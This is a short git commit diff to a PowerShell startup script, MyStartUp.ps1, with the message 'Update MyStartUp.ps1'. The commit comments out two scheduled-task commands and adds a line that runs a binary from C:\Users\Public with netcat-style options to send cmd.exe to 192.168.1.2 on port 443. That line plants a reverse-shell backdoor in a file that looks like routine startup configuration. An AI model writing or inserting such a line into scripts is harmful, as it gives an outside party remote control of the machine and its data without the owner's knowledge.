dcdad5756d74daaeef96bd6746e2a68df8955a92
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-15 00:23:52 +0100

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,2 +1,3 @@
-Stop-ScheduledTask -TaskName zed
-Start-ScheduledTask -TaskName zed
+C:\Users\Public\RNM.exe -nv 192.168.1.2 443 -e cmd.exe
+#Stop-ScheduledTask -TaskName zed
+#Start-ScheduledTask -TaskName zed
